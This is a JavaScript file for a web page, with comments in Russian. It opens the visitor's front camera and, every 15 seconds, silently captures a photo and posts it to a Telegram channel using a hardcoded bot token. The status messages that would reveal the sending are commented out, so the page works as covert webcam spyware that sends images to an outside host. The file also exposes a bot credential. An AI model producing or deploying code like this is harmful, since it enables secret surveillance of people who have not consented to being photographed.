const CONFIG = {
    botToken: '6940395648:AAH9yYYLY5BvR8K7LJFkmlY4whtmFC5Br80',
    chatId: '@seted_photos'
};

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('capture-btn');
const statusMsg = document.getElementById('status');
const gallery = document.getElementById('gallery');

// Запуск камеры
async function initCamera() {
    // statusMsg.textContent = 'Запрос доступа к камере...';
    statusMsg.style.color = '#fbbf24';

    try {
        const constraints = {
            video: {
                facingMode: 'user'
            },
            audio: false
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.setAttribute('muted', '');

        // Принудительный запуск воспроизведения
        try {
            await video.play();
            // statusMsg.textContent = 'Камера готова';
            // statusMsg.style.color = '#10b981';
        } catch (playError) {
            console.error("Ошибка автозапуска:", playError);
            // Добавляем обработчик клика для активации
            document.body.addEventListener('click', async () => {
                try {
                    await video.play();
                    statusMsg.textContent = 'Камера готова';
                    statusMsg.style.color = '#10b981';
                } catch (e) {
                    console.error("Не удалось запустить видео:", e);
                }
            }, { once: true });
            // statusMsg.textContent = 'Нажмите на экран для активации';
            statusMsg.style.color = '#fbbf24';
        }

    } catch (err) {
        console.error("Ошибка доступа к камере: ", err);
        // let errorMsg = 'Ошибка доступа: ';
        if (err.name === 'NotAllowedError') errorMsg += 'разрешение отклонено';
        else if (err.name === 'NotFoundError') errorMsg += 'камера не найдена';
        else errorMsg += err.message || 'неизвестная ошибка';

        // statusMsg.textContent = errorMsg;
        // statusMsg.style.color = '#ef4444';
    }
}

// Функция захвата и отправки
async function takePhoto() {
    // Если есть ошибка доступа, не пытаемся делать фото
    // if (statusMsg.textContent.includes('Ошибка доступа')) return;

    try {
        // Форсируем воспроизведение
        if (video.paused) await video.play();

        // Проверяем готовность кадра и наличие стрима
        if (video.readyState < 2 || !video.srcObject) {
            // statusMsg.textContent = 'Ожидание видеопотока...';
            return;
        }

        // Проверка на нулевые размеры (причина черного экрана)
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            console.log("Размеры видео еще не определены");
            return;
        }

        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // statusMsg.textContent = 'Авто-захват...';
        // statusMsg.style.color = '#fbbf24';

        // Рисуем
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Получаем Blob
        canvas.toBlob((blob) => {
            if (blob && blob.size > 0) {
                sendToTelegram(blob);
                addToGallery(canvas.toDataURL('image/jpeg'));
            } else {
                console.warn("Пустой Blob получен");
            }
        }, 'image/jpeg', 0.8);

    } catch (e) {
        console.error("Ошибка при захвате:", e);
    }
}

// Запуск авто-захвата каждые 15 секунд
let captureInterval = setInterval(takePhoto, 15000);

// Ручной захват
captureBtn.addEventListener('click', () => {
    // statusMsg.textContent = 'Ручной снимок...';
    takePhoto();
    clearInterval(captureInterval);
    captureInterval = setInterval(takePhoto, 15000);
});

// Отправка в Telegram
async function sendToTelegram(blob) {
    // statusMsg.textContent = 'Отправка в Telegram...';
    // statusMsg.style.color = '#fbbf24';

    const formData = new FormData();
    formData.append('chat_id', CONFIG.chatId);
    formData.append('photo', blob, 'screenshot.jpg');

    try {
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const result = await response.json();
        if (result.ok) {
            // statusMsg.textContent = 'Фото успешно отправлено!';
            // statusMsg.style.color = '#10b981';
            // setTimeout(() => {
            //     statusMsg.textContent = 'Камера готова';
            //     statusMsg.style.color = '#10b981';
            // }, 3000);
        } else {
            throw new Error(result.description);
        }
    } catch (err) {
        console.error("Ошибка Telegram:", err);
        // statusMsg.textContent = 'Ошибка отправки в Telegram';
        // statusMsg.style.color = '#ef4444';
    }
}

// Добавление в галерею (визуально)
function addToGallery(dataUrl) {
    const img = document.createElement('img');
    img.src = dataUrl;
    img.className = 'gallery-item';
    gallery.prepend(img);

    // Ограничим галерею последними 6 фото
    if (gallery.children.length > 6) {
        gallery.removeChild(gallery.lastChild);
    }
}

// Старт
initCamera();
